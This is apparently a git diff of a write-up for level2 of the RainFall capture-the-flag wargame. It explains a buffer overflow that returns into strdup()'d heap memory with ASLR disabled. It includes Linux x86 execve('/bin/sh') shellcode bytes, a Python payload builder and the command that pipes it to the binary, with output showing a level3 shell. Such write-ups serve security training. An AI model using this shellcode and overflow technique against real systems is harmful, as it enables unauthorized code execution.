@@ -1,5 +1,6 @@
-LEVEL_2:
-# 📚 Exploiting `level2` – Exploit the overflow to get a shell.
+<h1 align="center"> LEVEL 2 </h1>
+
+## 🔍 Analysis of Decompiled [level2](./source.c)
 since stack has execution protection this is a heap overflow, we execute shellcode from the heap using strdup().
 
 Exploit Strategy:</br>
@@ -17,7 +18,7 @@ ASLR (Address Space Layout Randomization) is disabled.
 level2@RainFall:~$ cat /proc/sys/kernel/randomize_va_space
 0
 ```
-ASLR off → heap address is stable (e.g., 0x0804a008).
+ASLR off → heap address is stable (e.g., `0x0804a008`).
 strdup() gives us a writable+executable space for shellcode.
 
 Find heap address after strdup() using GDB:
@@ -34,7 +35,7 @@ Find heap address after strdup() using GDB:
 (gdb) run < <(python exploit.py)
 (gdb) info registers
 ```
-Craft payload:
+## 💥 Exploit 
 
 Shellcode: 25-byte Linux x86 execve("/bin/sh").
 ```sh
@@ -60,7 +61,7 @@ shellcode = (
 Padding to 76 bytes.</br>
 Overwrite EBP (4 bytes).</br>
 Overwrite RET with heap address.
-```
+```py
 from struct import pack
 shellcode = (
     "\x31\xc0\x50\x68\x2f\x2f\x73\x68"
@@ -74,5 +75,8 @@ payload += "B" * 4
 payload += pack("<I", heap_addr)
 print(payload)
 ```
-
-> (python exploit.py; cat) | ./level2
+```sh
+(python exploit.py; cat) | ./level2
+ whoami
+ level3
+```
